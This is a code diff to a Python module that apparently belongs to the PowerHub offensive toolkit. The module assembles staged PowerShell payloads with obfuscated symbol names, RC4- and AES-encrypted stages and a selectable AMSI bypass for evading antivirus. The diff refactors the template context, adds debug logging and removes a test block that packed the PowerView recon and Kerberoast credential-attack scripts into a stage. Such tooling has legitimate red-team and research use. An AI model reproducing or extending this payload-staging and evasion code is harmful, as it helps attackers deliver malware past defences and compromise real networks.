@@ -1,10 +1,18 @@
 import base64
+import logging
 import os
+import random
 import re
 import string
-import random
 
-from powerhub.dhkex import DH_N, DH_G, DH_ENDPOINT
+from jinja2 import Environment, FileSystemLoader
+
+from powerhub.tools import encrypt_rc4, encrypt_aes
+from powerhub.directories import BASE_DIR
+from powerhub.env import powerhub_app as ph_app
+
+
+log = logging.getLogger(__name__)
 
 symbol_list = {None: None}
 
@@ -13,7 +21,15 @@ def symbol_name(name):
     global symbol_list
     if name not in symbol_list:
         symbol_list[name] = choose_obfuscated_name()
+        log.debug("New obfuscated symbol: %s -> %s" % (name, symbol_list[name]))
     return symbol_list[name]
+
+
+def debug(msg, dbg=False):
+    """This is a function for debugging statements in jinja2 templates"""
+    if dbg:
+        return msg + ";"
+    return ""
 
 
 def choose_obfuscated_name():
@@ -33,26 +49,19 @@ def choose_obfuscated_name():
 # TODO add jinja include_randomize_whitespace
 # TODO add jinja powershell decoys
 
-def get_stage(key, callback='', amsi_bypass='reflection', stage3_files=[], stage3_strings=[]):
-    from jinja2 import Environment, FileSystemLoader
-
-    from powerhub.tools import encrypt_rc4, encrypt_aes
-    from powerhub.directories import BASE_DIR
-
+def get_stage(key, amsi_bypass='reflection', jinja_context={}, stage3_files=[], stage3_strings=[]):
     if amsi_bypass:
         assert '/' not in amsi_bypass
         amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
+    else:
+        amsi_bypass = ''
 
     context = {
+        'symbol_name': symbol_name,
         'key': key,
         'amsibypass': amsi_bypass,
-        'symbol_name': symbol_name,
-        'full': True,
-        "DH_G": DH_G,
-        "DH_N": DH_N,
-        "endpoint": DH_ENDPOINT,
-        "callback_url": callback,
     }
+    context.update(jinja_context)
 
     env = Environment(loader=FileSystemLoader(
         os.path.join(BASE_DIR, 'templates')
@@ -62,6 +71,7 @@ def get_stage(key, callback='', amsi_bypass='reflection', stage3_files=[], stage
         return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()
 
     env.filters['rc4encrypt'] = rc4encrypt
+    env.filters['debug'] = lambda msg: debug(msg, dbg=ph_app.args.DEBUG)
 
     stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))
 
@@ -76,8 +86,7 @@ def get_stage(key, callback='', amsi_bypass='reflection', stage3_files=[], stage
             buffer = open(t, 'r').read()
         else:
             buffer = t
-        buffer = encrypt_aes(buffer.encode(), key)
-        buffer = base64.b64encode(buffer).decode()
+        buffer = encrypt_aes(buffer, key)
         stage3.append(buffer)
 
     context['stage2'] = stage2
@@ -102,10 +111,3 @@ def remove_blank_lines(text):
     ]
     result = '\n'.join(result)
     return result
-
-
-if __name__ == "__main__":
-    print(get_stage('e97f6QqB6LIsjjbdum', stage3_files=[
-        '/home/avollmer/git/PowerSploit/Recon/PowerView.ps1',
-        '/home/avollmer/git/Get-KerberoastHash.ps1',
-    ]))
